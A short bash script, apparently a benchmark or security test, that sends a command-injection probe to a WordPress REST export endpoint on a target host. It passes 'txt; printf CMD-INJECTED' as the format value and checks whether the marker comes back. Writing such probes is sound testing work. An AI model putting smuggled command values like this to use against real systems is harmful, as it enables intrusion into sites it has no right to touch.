#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
curl -s --get "$TARGET/wp-json/bench-tasks/v1/export" --data-urlencode "format=txt; printf CMD-INJECTED" | grep -q "CMD-INJECTED"
